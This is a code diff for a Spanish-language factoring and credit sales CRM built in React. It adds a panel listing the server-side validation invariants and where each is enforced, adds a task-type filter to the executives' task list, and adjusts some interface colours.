+        <CfgCampo l="Piso económico / mínimo absoluto" hint="Bajo el piso la operación es inviable; bajo el mínimo absoluto no se autoriza nunca.">
           <div className="flex items-center gap-2"><input {...num("pisoTasa", 0, 10, 0.01)} /><span className="t10" style={{ color: C.faint }}>piso</span><input {...num("tasaMinAbsoluta", 0, 10, 0.01)} /><span className="t10" style={{ color: C.faint }}>mín.</span></div>
-        </Campo>
-        <Campo l="Atribuciones de descuento" hint="% que autoriza el ejecutivo y % máximo con jefatura. Sobre el máximo requiere Gerente Comercial.">
+        </CfgCampo>
+        <CfgCampo l="Atribuciones de descuento" hint="% que autoriza el ejecutivo y % máximo con jefatura. Sobre el máximo requiere Gerente Comercial.">
           <div className="flex items-center gap-2"><input {...num("descEjec", 0, 100)} /><span className="t10" style={{ color: C.faint }}>% ejec.</span><input {...num("descMax", 0, 100)} /><span className="t10" style={{ color: C.faint }}>% jefat.</span></div>
-        </Campo>
-        <Campo l="Condiciones base" hint="Anticipo por defecto, comisión mínima (UF) y gastos operacionales por operación.">
+        </CfgCampo>
+        <CfgCampo l="Condiciones base" hint="Anticipo por defecto, comisión mínima (UF) y gastos operacionales por operación.">
           <div className="flex items-center gap-2"><input {...num("anticipoDefault", 0, 100)} /><span className="t10" style={{ color: C.faint }}>% ant.</span><input {...num("comisionUF", 0, 50, 0.5)} /><span className="t10" style={{ color: C.faint }}>UF</span></div>
           <div className="mt-2 flex items-center gap-2"><input {...num("gastosCLP", 0, 1000000, 1000)} /><span className="t10 whitespace-nowrap" style={{ color: C.faint }}>gastos CLP</span><input {...num("valorUF", 1000, 100000, 100)} /><span className="t10 whitespace-nowrap" style={{ color: C.faint }}>valor UF</span></div>
-        </Campo>
-        <Campo l="Política de compra" hint="Nota mínima del deudor y concentración máxima por deudor sobre la línea.">
+        </CfgCampo>
+        <CfgCampo l="Política de compra" hint="Nota mínima del deudor y concentración máxima por deudor sobre la línea.">
           <div className="flex items-center gap-2"><input {...num("notaMinCompra", 1, 5, 0.1)} /><span className="t10" style={{ color: C.faint }}>nota mín.</span><input {...num("concentracionDeudorPct", 1, 100)} /><span className="t10" style={{ color: C.faint }}>% conc.</span></div>
-        </Campo>
-        <Campo l="Otros deudores · límite" hint="% máximo de la línea asignable al grupo «otros deudores».">
+        </CfgCampo>
+        <CfgCampo l="Otros deudores · límite" hint="% máximo de la línea asignable al grupo «otros deudores».">
           <div className="flex items-center gap-2"><input {...num("otrosDeudoresPct", 0, 100)} /><span className="t10" style={{ color: C.faint }}>%</span></div>
-        </Campo>
-        <Campo l="Vigencia de la línea" hint="Meses de vigencia con que se propone una línea al comité.">
+        </CfgCampo>
+        <CfgCampo l="Vigencia de la línea" hint="Meses de vigencia con que se propone una línea al comité.">
           <div className="flex items-center gap-2"><input {...num("vigenciaLineaMeses", 1, 60)} /><span className="t10" style={{ color: C.faint }}>meses</span></div>
-        </Campo>
-        <Campo l="Ventana del libro de ventas" hint="Días hacia atrás en que se buscan facturas candidatas del cliente.">
+        </CfgCampo>
+        <CfgCampo l="Ventana del libro de ventas" hint="Días hacia atrás en que se buscan facturas candidatas del cliente.">
           <div className="flex items-center gap-2"><input {...num("ventanaLibroDias", 7, 365)} /><span className="t10" style={{ color: C.faint }}>días</span></div>
-        </Campo>
+        </CfgCampo>
       </div>
       <div className="mt-3 flex items-center justify-between gap-3 rounded-lg p-2.5" style={{ backgroundColor: C.page, border: `1px solid ${C.line}` }}>
         <div className="t10" style={{ color: C.sub }}>Los cambios se aplican en caliente (el proceso en background se reinicia con la nueva frecuencia) y se persisten por tenant.</div>
@@ -12173,11 +14275,103 @@ function CfgFuncionalidades({ cfgOper, setCfgOper }) {
     </div>
   );
 }
-// Consola de sistema: log técnico + versionado, en un solo lugar y consultable desde la app.
+// Visor del contrato de validación (A04). Es documentación VIVA: la tabla se arma desde el mismo
+// arreglo INVARIANTES que usa el gate, así que no puede quedar desactualizada respecto del código.
+function CfgContrato() {
+  const [, force] = useState(0);
+  const [abierto, setAbierto] = useState(null);
+  const total = Object.values(CONTRATO_RECHAZOS).reduce((a, b) => a + b, 0);
+  const APLIC = {
+    repositorio: { l: "Repositorio", c: "#703EFF", bg: "#F1ECFF" },
+    funcion: { l: "En la función", c: "#2563EB", bg: "#EFF6FF" },
+    motor: { l: "Motor de inbound", c: "#16A34A", bg: "#F0FDF4" },
+    ui: { l: "Sólo UI", c: "#C2410C", bg: "#FFF7ED" },
+    observado: { l: "Observado", c: "#6B7280", bg: "#F3F4F6" },
+  };
+  const conEvaluador = INVARIANTES.filter((i) => typeof i.evaluar === "function").length;
+  const soloUI = INVARIANTES.filter((i) => i.aplicado === "ui").length;
+  // Cableadas de verdad = las que algún punto del código invoca. Tener evaluador escrito no basta:
+  // los de «Sólo UI» existen como contrato pero nadie los llama, y contarlos como aplicados sería
+  // exactamente el autoengaño que este visor tiene que evitar.
+  const cableadas = INVARIANTES.filter((i) => i.aplicado === "repositorio" || i.aplicado === "funcion" || i.aplicado === "motor").length;
+  const kpis = [
+    { t: "Invariantes", v: INVARIANTES.length, s: `${conEvaluador} con evaluador ejecutable`, c: C.ink, bg: "#fff", bd: C.line },
+    { t: "Se hacen cumplir acá", v: cableadas, s: "cableadas en repositorio, motor o función", c: "#16A34A", bg: C.greenBg, bd: "#bbf7d0" },
+    { t: "Sólo UI", v: soloUI, s: "escritas como contrato, pero NINGÚN punto del código las invoca", c: "#C2410C", bg: C.amberBg, bd: "#FED7AA" },
+    { t: "Rechazos en la sesión", v: total, s: "intentos que el contrato bloqueó o contó", c: C.indigo, bg: "#f5f3ff", bd: "#ddd6fe" },
+  ];
+  return (
+    <div className="space-y-4">
+      <div className="rounded-2xl p-4" style={{ backgroundColor: "#fff", border: `1px solid ${C.line}` }}>
+        <div className="flex flex-wrap items-center justify-between gap-2">
+          <div>
+            <div className="t13 font-bold" style={{ color: C.ink }}>Contrato de validación del servidor</div>
+            <div className="t11" style={{ color: C.faint }}>OWASP A04 · Insecure Design — versión del contrato <b style={{ color: C.ink }}>{CONTRATO_VERSION}</b></div>
+          </div>
+          <button onClick={() => force((x) => x + 1)} className="rounded-full px-3 py-1.5 t11 font-semibold" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}>Actualizar contadores</button>
+        </div>
+        <div className="mt-3 rounded-xl p-3 t11" style={{ backgroundColor: C.amberBg, border: "1px solid #FED7AA", color: C.amber, lineHeight: 1.5 }}>
+          <b>El cliente no es un control de seguridad.</b> Toda la regla de negocio de esta app vive acá, y el
+          usuario controla el código que la ejecuta. Estas invariantes existen para que el resolver GraphQL las
+          implemente <b>1:1 y devuelva el mismo código de error</b>, no para reemplazarlo. Las marcadas
+          «Sólo UI» se saltan desde la consola del navegador.
+        </div>
+        <div className="mt-3 grid grid-cols-2 gap-2 md:grid-cols-4">
+          {kpis.map((k, i) => (
+            <div key={i} className="rounded-xl p-3" style={{ backgroundColor: k.bg, border: `1px solid ${k.bd}` }}>
+              <div className="t9 font-bold uppercase tracking-wide" style={{ color: k.c }}>{k.t}</div>
+              <div className="text-xl font-bold" style={{ color: k.c }}>{k.v}</div>
+              <div className="mt-0.5 t9" style={{ color: C.faint, lineHeight: 1.35 }}>{k.s}</div>
+            </div>
+          ))}
+        </div>
+        <div className="mt-3 t9" style={{ color: C.faint }}>
+          Límite de tasa vigente en el cliente: {CONTRATO_LIMITES.porMinuto.default} mutaciones/min por colección
+          (ventana {CONTRATO_LIMITES.ventanaMs / 1000}s). Es holgado a propósito: corta automatización, no la operación normal. El tope real lo fija el gateway.
+        </div>
+      </div>
+      <div className="overflow-x-auto rounded-2xl" style={{ backgroundColor: "#fff", border: `1px solid ${C.line}` }}>
+        <table className="w-full border-collapse t11" style={{ minWidth: "980px" }}>
+          <thead><tr>{["Código", "Invariante", "Mutaciones", "Autoridad", "Dónde se aplica hoy", "Rechazos"].map((h) => (
+            <th key={h} className="px-3 py-2.5 text-left t9 font-bold uppercase tracking-wide" style={{ color: C.faint, borderBottom: `1px solid ${C.line}` }}>{h}</th>
+          ))}</tr></thead>
+          <tbody>
+            {INVARIANTES.map((inv) => { const ap = APLIC[inv.aplicado] || APLIC.observado; const on = abierto === inv.codigo; const n = CONTRATO_RECHAZOS[inv.codigo] || 0; return (
+              <Fragment key={inv.codigo}>
+                <tr onClick={() => setAbierto(on ? null : inv.codigo)} className="cursor-pointer hover:bg-stone-50" style={{ borderBottom: `1px solid ${C.line}` }} title="Ver la regla y qué tiene que hacer el servidor">
+                  <td className="whitespace-nowrap px-3 py-2.5 t11 font-bold" style={{ color: C.indigo }}>{inv.codigo}</td>
+                  <td className="px-3 py-2.5 t12 font-medium" style={{ color: C.ink }}>{inv.nombre}</td>
+                  <td className="px-3 py-2.5 t10" style={{ color: C.sub, maxWidth: 260 }}>{inv.mutaciones.join(" · ")}</td>
+                  <td className="whitespace-nowrap px-3 py-2.5"><span className="rounded-full px-2 py-0.5 t10 font-semibold" style={{ backgroundColor: inv.autoridad === "servidor" ? "#F1ECFF" : "#F3F4F6", color: inv.autoridad === "servidor" ? "#5B21D6" : C.sub }}>{inv.autoridad}</span></td>
+                  <td className="whitespace-nowrap px-3 py-2.5"><span className="rounded-full px-2 py-0.5 t10 font-semibold" style={{ backgroundColor: ap.bg, color: ap.c }}>{ap.l}</span></td>
+                  <td className="whitespace-nowrap px-3 py-2.5 t11 font-semibold" style={{ color: n ? "#C2410C" : C.faint, fontVariantNumeric: "tabular-nums" }}>{n || "—"}</td>
+                </tr>
+                {on && (
+                  <tr style={{ borderBottom: `1px solid ${C.line}`, backgroundColor: "#FAFAFB" }}>
+                    <td colSpan={6} className="px-3 py-3">
+                      <div className="t9 font-bold uppercase tracking-wide" style={{ color: C.faint }}>Regla</div>
+                      <div className="mt-0.5 t11" style={{ color: C.ink, lineHeight: 1.5 }}>{inv.regla}</div>
+                      <div className="mt-2 t9 font-bold uppercase tracking-wide" style={{ color: C.faint }}>Qué tiene que hacer el servidor</div>
+                      <div className="mt-0.5 t11" style={{ color: C.sub, lineHeight: 1.5 }}>{inv.servidor}</div>
+                      {typeof inv.evaluar !== "function" && <div className="mt-2 t10" style={{ color: C.amber }}>Sin evaluador en el cliente: se hace cumplir en la capa de datos (repositorio).</div>}
+                      {inv.aplicado === "ui" && <div className="mt-2 t10" style={{ color: C.amber }}>El evaluador existe pero <b>ningún punto del código lo invoca</b>: hoy esta invariante sólo la sostiene la pantalla, y la pantalla no es un control.</div>}
+                    </td>
+                  </tr>
+                )}
+              </Fragment>
+            ); })}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  );
+}
+// Consola de sistema: log técnico + versionado + contrato, consultables desde la app.
 function CfgSistema() {
   const [tab, setTab] = useState("logs");
   const nErr = SYS_LOG.filter((e) => e.nivel === "error").length;
-  const tabs = [["logs", `Logs${nErr ? ` · ${nErr} error(es)` : ""}`], ["version", "Versión y diagnóstico"]];
+  const nRech = Object.values(CONTRATO_RECHAZOS).reduce((a, b) => a + b, 0);
+  const tabs = [["logs", `Logs${nErr ? ` · ${nErr} error(es)` : ""}`], ["version", "Versión y diagnóstico"], ["contrato", `Contrato servidor${nRech ? ` · ${nRech}` : ""}`]];
   return (
     <div className="grid gap-4">
       <div className="flex items-center gap-4" style={{ borderBottom: `1px solid ${C.line}` }}>
@@ -12186,7 +14380,7 @@ function CfgSistema() {
             style={{ background: "none", border: "none", borderBottom: tab === k ? `2px solid ${C.indigo}` : "2px solid transparent", color: tab === k ? C.indigo : C.sub }}>{l}</button>
         ))}
       </div>
-      {tab === "logs" ? <LogsView /> : <CfgVersion />}
+      {tab === "logs" ? <LogsView /> : tab === "contrato" ? <CfgContrato /> : <CfgVersion />}
     </div>
   );
 }
@@ -12223,7 +14417,7 @@ function ConfiguracionView({ usuario, cfgOper, setCfgOper }) {
 }
 // Categorías de tareas (por objetivo comercial) + prioridad. Consolidan pipeline + cartera de clientes.
 const TAREA_CATS = {
-  responder: { label: "Responder", desc: "Conversaciones activas del pipeline: el cliente respondió y espera tu gestión.", color: "#dc2626", Icon: MessageSquare },
+  responder: { label: "Responder", desc: "Conversaciones activas del pipeline: el cliente respondió y espera tu gestión.", color: "#EF4444", Icon: MessageSquare },
   contactabilidad: { label: "Contactabilidad", desc: "Contactos no verificados o con error: repara el teléfono/correo para poder operar.", color: "#0891b2", Icon: Bell },
   cerrar: { label: "Oferta / Negociación", desc: "Oportunidades en oferta / aceptada / otorgamiento por cursar y girar.", color: "#703EFF", Icon: Check },
   retener: { label: "Retener", desc: "Clientes en fuga o caída: recupéralos antes de perderlos ante la competencia.", color: "#ea580c", Icon: AlertTriangle },
@@ -12234,7 +14428,7 @@ const TAREA_CATS = {
 // Orden de PRIORIDAD de los grupos: primero Oferta/Negociación, Contactabilidad, Reactivar, Retener,
 // Prospectar; después el resto (Responder, Nuevas empresas). Rige pills, ordenación de la lista y treemap.
 const TAREA_CAT_ORDER = ["cerrar", "contactabilidad", "reactivar", "retener", "prospectar", "responder", "capturar"];
-const TAREA_PRIO = { critica: { l: "Crítica", c: "#dc2626", o: 0 }, alta: { l: "Alta", c: "#ea580c", o: 1 }, media: { l: "Media", c: "#ca8a04", o: 2 } };
+const TAREA_PRIO = { critica: { l: "Crítica", c: "#EF4444", o: 0 }, alta: { l: "Alta", c: "#ea580c", o: 1 }, media: { l: "Media", c: "#ca8a04", o: 2 } };
 // Consolida en tareas: (1) las oportunidades del pipeline (por etapa/estado) y (2) la cartera de clientes
 // del panel (fugas, competencia, inactivos), cada una asignada a su ejecutivo y categorizada.
 function generarTareasConsolidadas(deals) {
@@ -12514,7 +14708,7 @@ function ReporteDiaPanel({ deals, execFilter, onClose, onOpen }) {
   const kpis = [
     { t: "Abiertas", v: abiertas.length, mm: sumMM(abiertas), col: "#5B21D6", bg: "#F1ECFF", bd: "#D9CCFF" },
     { t: "Ganadas · giro", v: ganadas.length, mm: sumMM(ganadas), col: "#16A34A", bg: "#F0FDF4", bd: "#bbf7d0" },
-    { t: "Perdidas", v: perdidas.length, mm: sumMM(perdidas), col: "#dc2626", bg: "#fef2f2", bd: "#fecaca" },
+    { t: "Perdidas", v: perdidas.length, mm: sumMM(perdidas), col: "#EF4444", bg: "#fef2f2", bd: "#fecaca" },
   ];
   const stageMeta = (s) => (STAGES.find((x) => x.id === s) || { name: s });
   const lista = base.slice().sort((a, b) => (tienePrioridadCurse(b.id) - tienePrioridadCurse(a.id)) || ((b.amountMM || 0) - (a.amountMM || 0)));
@@ -12554,7 +14748,7 @@ function ReporteDiaPanel({ deals, execFilter, onClose, onOpen }) {
               {lista.map((d) => {
                 const prio = tienePrioridadCurse(d.id);
                 const won = d.stage === "giro", lost = d.stage === "perdida";
-                const eCol = won ? "#16A34A" : lost ? "#dc2626" : "#5B21D6";
+                const eCol = won ? "#16A34A" : lost ? "#EF4444" : "#5B21D6";
                 const eBg = won ? "#F0FDF4" : lost ? "#fef2f2" : "#F1ECFF";
                 return (
                   <button key={d.id} onClick={() => { onOpen && onOpen(d); onClose(); }} className="flex w-full items-center gap-2 rounded-lg p-2 text-left" style={{ border: `1px solid ${prio ? "#FED7AA" : C.line}`, backgroundColor: prio ? "#FFF7ED" : "#fff" }}>
@@ -12774,10 +14968,17 @@ function seedTareasDemo(deals, ejecName) {
 // en columnas). Consolida (1) las tareas asignadas desde el sistema de gestión y (2) las oportunidades
 // marcadas con prioridad de curse por la jefatura (se auto-atienden al cursar / ceder / bloquearse).
 // Cada fila abre un DRAWER lateral con el detalle completo y una BITÁCORA de comentarios de gestión.
-function PCtareas({ deals, execFilter, onOpen, esJefe, usuarioNombre, usuario, onOpenSolic, onIrLineas }) {
+function PCtareas({ deals, execFilter, onOpen, esJefe, usuarioNombre, usuario, onOpenSolic, onIrLineas, selTipo }) {
   const [, force] = useState(0); const bump = () => force((v) => v + 1);
   const [sel, setSel] = useState(null);   // { kind, id } — ítem abierto en el drawer
   const [vista, setVista] = useState("activas"); // activas | resueltas
+  // Filtro por tipo de ítem: es el mismo corte que muestran las cards de «Tareas» del Dashboard
+  // (prioridades, líneas por gestionar, tareas asignadas), así que al llegar desde una card se aterriza
+  // con la lista ya acotada a lo que el ejecutivo pinchó. El shell manda un objeto NUEVO en cada clic,
+  // así que volver a pinchar la misma card reaplica el filtro aunque se haya cambiado a mano.
+  const [fTipo, setFTipo] = useState((selTipo && selTipo.tipo) || "todos");
+  useEffect(() => { if (selTipo && selTipo.tipo) setFTipo(selTipo.tipo === "mensajes" ? "todos" : selTipo.tipo); }, [selTipo]);
+  const alternarTipo = (k) => setFTipo((prev) => prev === k ? "todos" : k);
   const [nota, setNota] = useState("");
   const enScope = (d) => execFilter === "todos" || EXECS[d.exec] === execFilter;
   const dealDe = (id) => deals.find((x) => x.id === id);
@@ -12830,7 +15031,7 @@ function PCtareas({ deals, execFilter, onOpen, esJefe, usuarioNombre, usuario, o
   };
   const activas = todas.filter((r) => !r.hecha).sort((a, b) => importancia(b) - importancia(a));
   const resueltas = todas.filter((r) => r.hecha).sort((a, b) => (b.monto || 0) - (a.monto || 0));
-  const rows = vista === "resueltas" ? resueltas : activas;
+  const rows = (vista === "resueltas" ? resueltas : activas).filter((r) => fTipo === "todos" || r.kind === fTipo);
   const selRow = sel ? todas.find((r) => r.kind === sel.kind && r.id === sel.id) : null;
   const marcarHecha = (r) => { if (r.kind === "task") r.task.hecha = !r.task.hecha; bump(); };
   const nPrioPend = rowsPrio.filter((r) => !r.hecha).length;
@@ -12867,30 +15068,39 @@ function PCtareas({ deals, execFilter, onOpen, esJefe, usuarioNombre, usuario, o
           <div className="text-xl font-bold" style={{ color: nMsg ? "#5B21D6" : C.ink }}>{nMsg}</div>
           <div className="mt-1 t9" style={{ color: C.faint, lineHeight: 1.35 }}>{nMsg ? "Requerimientos de información del otorgamiento asignados a ti. Click para responder." : "Sin requerimientos de información pendientes."}</div>
         </button>
-        {/* Líneas por gestionar (SOW + fuera de línea) */}
-        <button onClick={nLineasGest && onIrLineas ? onIrLineas : undefined} className="rounded-xl p-3 text-left" style={{ backgroundColor: nLineasGest ? "#FFF7ED" : "#fff", border: `1px solid ${nLineasGest ? "#FED7AA" : C.line}`, cursor: nLineasGest && onIrLineas ? "pointer" : "default" }}>
+        {/* Líneas por gestionar (SOW + fuera de línea) — filtra la lista; el enlace salta al menú Líneas */}
+        <button onClick={() => alternarTipo("linea")} className="rounded-xl p-3 text-left" style={{ backgroundColor: nLineasGest ? "#FFF7ED" : "#fff", border: `1px solid ${fTipo === "linea" ? "#C2410C" : nLineasGest ? "#FED7AA" : C.line}`, boxShadow: fTipo === "linea" ? "0 0 0 1.5px #C2410C" : "none", cursor: "pointer" }}>
           <div className="flex items-center gap-1.5 t9 font-bold uppercase tracking-wide" style={{ color: nLineasGest ? "#C2410C" : C.faint }}><AlertTriangle size={11} /> Líneas por gestionar</div>
           <div className="text-xl font-bold" style={{ color: nLineasGest ? "#C2410C" : C.ink }}>{nLineasGest}</div>
           <div className="mt-1 t9" style={{ color: C.faint, lineHeight: 1.35 }}><b style={{ color: C.sub }}>{nLineasSOW}</b> líneas que requieren atención para asegurar el SOW · <b style={{ color: C.sub }}>{nFueraLinea}</b> operaciones fuera de línea urgentes para el curse.</div>
+          {onIrLineas && <span onClick={(e) => { e.stopPropagation(); onIrLineas(); }} className="mt-1 inline-block t9 font-semibold" style={{ color: "#C2410C", textDecoration: "underline" }}>Ver en Líneas →</span>}
         </button>
         {/* Prioridades por atender (jefatura) */}
-        <div className="rounded-xl p-3" style={{ backgroundColor: "#fff", border: `1px solid ${nPrioPend ? "#FED7AA" : C.line}` }}>
+        <button onClick={() => alternarTipo("prio")} className="rounded-xl p-3 text-left" style={{ backgroundColor: "#fff", border: `1px solid ${fTipo === "prio" ? "#C2410C" : nPrioPend ? "#FED7AA" : C.line}`, boxShadow: fTipo === "prio" ? "0 0 0 1.5px #C2410C" : "none", cursor: "pointer" }}>
           <div className="flex items-center gap-1.5 t9 font-bold uppercase tracking-wide" style={{ color: C.ink }}><Star size={11} style={{ color: nPrioPend ? "#C2410C" : C.faint, fill: nPrioPend ? "#F97316" : "none" }} /> Prioridades por atender</div>
           <div className="flex items-baseline gap-1.5"><span className="text-xl font-bold" style={{ color: C.ink }}>{nPrioPend}</span>{nPrioAt > 0 && <span className="t9 font-semibold" style={{ color: "#16A34A" }}>· {nPrioAt} atendidas</span>}</div>
           <div className="mt-1 t9" style={{ color: C.faint, lineHeight: 1.35 }}>Oportunidades priorizadas por la jefatura para el curse. Se atienden solas al cursar, ceder o bloquearse.</div>
-        </div>
+        </button>
         {/* Tareas asignadas */}
-        <div className="rounded-xl p-3" style={{ backgroundColor: "#fff", border: `1px solid ${C.line}` }}>
+        <button onClick={() => alternarTipo("task")} className="rounded-xl p-3 text-left" style={{ backgroundColor: "#fff", border: `1px solid ${fTipo === "task" ? C.indigo : C.line}`, boxShadow: fTipo === "task" ? `0 0 0 1.5px ${C.indigo}` : "none", cursor: "pointer" }}>
           <div className="flex items-center gap-1.5 t9 font-bold uppercase tracking-wide" style={{ color: C.ink }}><ClipboardList size={11} style={{ color: "#703EFF" }} /> Tareas asignadas</div>
           <div className="text-xl font-bold" style={{ color: C.ink }}>{nTaskPend}</div>
           <div className="mt-1 t9" style={{ color: C.faint, lineHeight: 1.35 }}>Pendientes, asignadas desde Gestión.</div>
-        </div>
+        </button>
       </div>
       {/* Dos vistas: Activas (por gestionar, ordenadas por importancia) y Resueltas / completadas */}
-      <div className="flex flex-wrap items-center gap-x-5" style={{ borderBottom: `1px solid ${C.line}` }}>
-        {vistas.map(([k, l, n]) => { const on = vista === k; return (
-          <button key={k} onClick={() => setVista(k)} className="flex items-center gap-1.5 px-1 pb-2 t12" style={{ borderBottom: `2px solid ${on ? C.indigo : "transparent"}`, color: on ? C.indigo : C.sub, fontWeight: on ? 600 : 400, marginBottom: -1 }}>{l}<span className="rounded-full px-1.5 t9 font-bold" style={{ backgroundColor: on ? "#F1ECFF" : C.page, color: on ? C.indigo : C.sub }}>{n}</span></button>
-        ); })}
+      <div className="flex flex-wrap items-center justify-between gap-x-5" style={{ borderBottom: `1px solid ${C.line}` }}>
+        <div className="flex flex-wrap items-center gap-x-5">
+          {vistas.map(([k, l, n]) => { const on = vista === k; return (
+            <button key={k} onClick={() => setVista(k)} className="flex items-center gap-1.5 px-1 pb-2 t12" style={{ borderBottom: `2px solid ${on ? C.indigo : "transparent"}`, color: on ? C.indigo : C.sub, fontWeight: on ? 600 : 400, marginBottom: -1 }}>{l}<span className="rounded-full px-1.5 t9 font-bold" style={{ backgroundColor: on ? "#F1ECFF" : C.page, color: on ? C.indigo : C.sub }}>{n}</span></button>
+          ); })}
+        </div>
+        {/* Filtro activo: se ve QUÉ se está mostrando y se sale de la selección de un clic. */}
+        {fTipo !== "todos" && (
+          <button onClick={() => setFTipo("todos")} className="mb-1.5 inline-flex items-center gap-1 rounded-full px-2.5 py-1 t10 font-semibold" style={{ backgroundColor: "#F1ECFF", color: C.indigo, border: "1px solid #D9CCFF" }}>
+            {fTipo === "prio" ? "Sólo prioridades" : fTipo === "linea" ? "Sólo líneas por gestionar" : "Sólo tareas asignadas"} <X size={11} />
+          </button>
+        )}
       </div>
       {/* Lista tipo pipeline */}
       {rows.length === 0 ? (
@@ -12991,7 +15201,7 @@ function PCtareas({ deals, execFilter, onOpen, esJefe, usuarioNombre, usuario, o
     </div>
   );
 }
-function TareasView({ deals, onOpen, soloExec, esJefe, usuarioNombre, usuario, onOpenSolic, onIrLineas, plan = {}, setPlan = () => {} }) {
+function TareasView({ deals, onOpen, soloExec, esJefe, usuarioNombre, usuario, onOpenSolic, onIrLineas, selTipo, plan = {}, setPlan = () => {} }) {
   const [fEjec, setFEjec] = useState("todos");
   const [, forceT] = useState(0);
   const ejec = soloExec || fEjec; // si hay usuario logueado, se fuerza a sus registros
@@ -13009,14 +15219,14 @@ function TareasView({ deals, onOpen, soloExec, esJefe, usuarioNombre, usuario, o
           : <select value={fEjec} onChange={(e) => setFEjec(e.target.value)} className="rounded-lg px-3 py-1.5 t12 font-semibold" style={{ border: `1px solid ${C.line}`, color: C.ink, backgroundColor: "#fff" }}><option value="todos">Todos los ejecutivos</option>{execOpts.map((n) => <option key={n} value={n}>{n}</option>)}</select>}</div>
       </div>
       <div className="w-full rounded-2xl bg-white p-5" style={{ border: `1px solid ${C.line}`, boxShadow: "0 4px 16px rgba(20,25,45,.05)" }}>
-        <PCtareas deals={deals} execFilter={ejec} onOpen={onOpen} esJefe={esJefe} usuarioNombre={usuarioNombre} usuario={usuario} onOpenSolic={onOpenSolic} onIrLineas={onIrLineas} />
+        <PCtareas deals={deals} execFilter={ejec} onOpen={onOpen} esJefe={esJefe} usuarioNombre={usuarioNombre} usuario={usuario} onOpenSolic={onOpenSolic} onIrLineas={onIrLineas} selTipo={selTipo} />
       </div>
     </div>
   );
 }
 // Metadatos por estado del cliente (icono + chip) para renderizar cualquier tipo en la lista.
 const RET_ESTADO = {
-  FUGA: { Icon: AlertTriangle, bg: "#FEF2F2", fg: "#ef4444", chipBg: "#FEF2F2", chipFg: "#DC2626", chip: "FUGA" },
+  FUGA: { Icon: AlertTriangle, bg: "#FEF2F2", fg: "#EF4444", chipBg: "#FEF2F2", chipFg: "#EF4444", chip: "FUGA" },
   CAÍDA: { Icon: ArrowDownRight, bg: "#FFF7ED", fg: "#F97316", chipBg: "#FFF7ED", chipFg: "#C2410C", chip: "CAÍDA" },
   Competencia: { Icon: ArrowUpRight, bg: "#EFF6FF", fg: "#2563eb", chipBg: "#EFF6FF", chipFg: "#2563EB", chip: "Competencia" },
   Inactivo: { Icon: Clock, bg: "#F1ECFF", fg: "#7c3aed", chipBg: "#F1ECFF", chipFg: "#7c3aed", chip: "Inactivo" },
@@ -13037,7 +15247,7 @@ function RetencionExecCard({ e, plan = {} }) {
   // Chips-filtro (clickeables) — fusionan retención (fuga/caída) + prioritarios (todos los estados).
   const chips = [
     { k: "todos", label: `Todos ${todos.length}`, on: { bg: C.ink, fg: "#fff" }, off: { bg: "#F3F4F6", fg: C.sub } },
-    { k: "fuga", label: `${cnt.fuga} fugados`, on: { bg: "#ef4444", fg: "#fff" }, off: { bg: "#FEF2F2", fg: "#DC2626" } },
+    { k: "fuga", label: `${cnt.fuga} fugados`, on: { bg: "#EF4444", fg: "#fff" }, off: { bg: "#FEF2F2", fg: "#EF4444" } },
     { k: "caida", label: `${cnt.caida} en caída`, on: { bg: "#F97316", fg: "#fff" }, off: { bg: "#FFF7ED", fg: "#C2410C" } },
     { k: "competencia", label: `${cnt.competencia} competencia`, on: { bg: "#2563eb", fg: "#fff" }, off: { bg: "#EFF6FF", fg: "#2563EB" } },
     { k: "inactivos", label: `${cnt.inactivos} inactivos`, on: { bg: "#7c3aed", fg: "#fff" }, off: { bg: "#F1ECFF", fg: "#7c3aed" } },
@@ -13053,7 +15263,7 @@ function RetencionExecCard({ e, plan = {} }) {
       <div className="flex flex-wrap items-center gap-3 rounded-xl p-3" style={{ background: "linear-gradient(100deg,#F1ECFF,#F1ECFF)" }}>
         <span className="flex h-10 w-10 items-center justify-center rounded-xl t12 font-bold text-white" style={{ backgroundColor: "#703EFF" }}>{e.ini}</span>
         <div className="min-w-0 flex-1"><div className="t15 font-bold" style={{ color: C.ink }}>{e.nombre}</div><div className="t10" style={{ color: C.faint }}>{e.zona} · {e.jefatura} · jefe {PC_JEFES[e.jefatura]}</div></div>
-        <div className="text-right"><div className="text-xl font-bold" style={{ color: "#ef4444" }}>{fmtMMc(riesgo)}</div><div className="t9 font-bold uppercase tracking-wide" style={{ color: C.faint }}>Security en riesgo</div></div>
+        <div className="text-right"><div className="text-xl font-bold" style={{ color: "#EF4444" }}>{fmtMMc(riesgo)}</div><div className="t9 font-bold uppercase tracking-wide" style={{ color: C.faint }}>Security en riesgo</div></div>
       </div>
       <div className="mt-3 flex flex-wrap items-center gap-2">
         {chips.map((ch) => { const act = f === ch.k; const st = act ? ch.on : ch.off; return (
@@ -13072,7 +15282,7 @@ function RetencionExecCard({ e, plan = {} }) {
           const meta = plan[c.id];
           const mm = ptmMetrics(c, meta, sig);
           const cumpl = meta.metaColoc ? Math.round(mm.colocReal / meta.metaColoc * 100) : 0;
-          const cumplC = cumpl >= 90 ? "#16A34A" : cumpl >= 60 ? "#C2410C" : "#DC2626";
+          const cumplC = cumpl >= 90 ? "#16A34A" : cumpl >= 60 ? "#C2410C" : "#EF4444";
           return (
             <div key={c.id} className="flex gap-3 py-3">
               <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-lg" style={{ backgroundColor: em.bg, color: em.fg }}><em.Icon size={13} /></span>
@@ -13095,7 +15305,7 @@ function RetencionExecCard({ e, plan = {} }) {
                       ? { Icon: Check, bg: "#F0FDF4", fg: "#16A34A", lab: "en target" }
                       : { Icon: ArrowUpRight, bg: "#F0FDF4", fg: "#16A34A", lab: "creciendo" };
                     else if (k === "Inactivo") sm = { Icon: Sparkles, bg: "#EFF6FF", fg: "#2563EB", lab: "nuevo" };
-                    else sm = { Icon: ArrowDownRight, bg: "#FEF2F2", fg: "#DC2626", lab: "bajando" };
+                    else sm = { Icon: ArrowDownRight, bg: "#FEF2F2", fg: "#EF4444", lab: "bajando" };
                     const SIcon = sm.Icon;
                     return (
                       <div className="flex flex-col items-end justify-center gap-1 rounded-lg px-3 py-2 text-right" style={{ flex: "1 1 130px", backgroundColor: sm.bg }}>
@@ -13138,7 +15348,7 @@ const nuevasEmpRealMes = (ini, mi) => 2 + (hashStr("nuevasEmp-" + ini + "-" + mi
 const mesCerrado = (mi) => mi < MES_ACT; // sólo los meses ya cerrados se cuantifican
